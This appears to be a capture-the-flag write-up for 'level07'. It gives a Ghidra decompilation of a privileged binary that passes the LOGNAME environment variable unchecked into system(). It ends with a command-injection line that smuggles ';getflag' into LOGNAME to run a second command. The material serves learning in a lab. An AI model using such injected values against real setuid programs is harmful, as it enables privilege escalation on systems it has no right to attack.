@@ -1,0 +1,73 @@
+level07:
+
+external tools used:
+	Ghidra
+
+ghidra decompiler on level07 (binary)
+
+
+int main(int argc,char **argv,char **envp)
+
+{
+  char *pcVar1;
+  int iVar2;
+  char *buffer;
+  gid_t gid;
+  uid_t uid;
+  char *local_1c;
+  __gid_t local_18;
+  __uid_t local_14;
+  
+  local_18 = getegid();
+  local_14 = geteuid();
+  setresgid(local_18,local_18,local_18);
+  setresuid(local_14,local_14,local_14);
+  local_1c = (char *)0x0;
+  pcVar1 = getenv("LOGNAME");
+  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
+  iVar2 = system(local_1c);
+  return iVar2;
+}
+
+
+man asprintf:
+	write to allocated string
+	(sprintf but allocated)
+
+code analysis:
+
+
+int main(int argc,char **argv,char **envp)
+{
+  char *logname;
+  int iVar2;
+  char *buffer;
+  gid_t gid;
+  uid_t uid;
+  char *formatted_result;
+  __gid_t egid;
+  __uid_t euid;
+
+/* Elevate permissions to flag account */  
+  egid = getegid();
+  euid = geteuid();
+  setresgid(egid, egid, egid);
+  setresuid(euid, euid, euid);
+
+
+/* Create a formatted string from logname */
+  formatted_result = (char *)NULL;
+  logname = getenv("LOGNAME");
+  asprintf(&format_result, "/bin/echo %s ", logname);
+
+/* Execute format result */
+  iVar2 = system(format_result);
+  return iVar2;
+}
+
+
+system is executed with "/bin/echo LOGNAME"..
+
+ace/rce:
+	LOGNAME=";getflag" ./level07
+
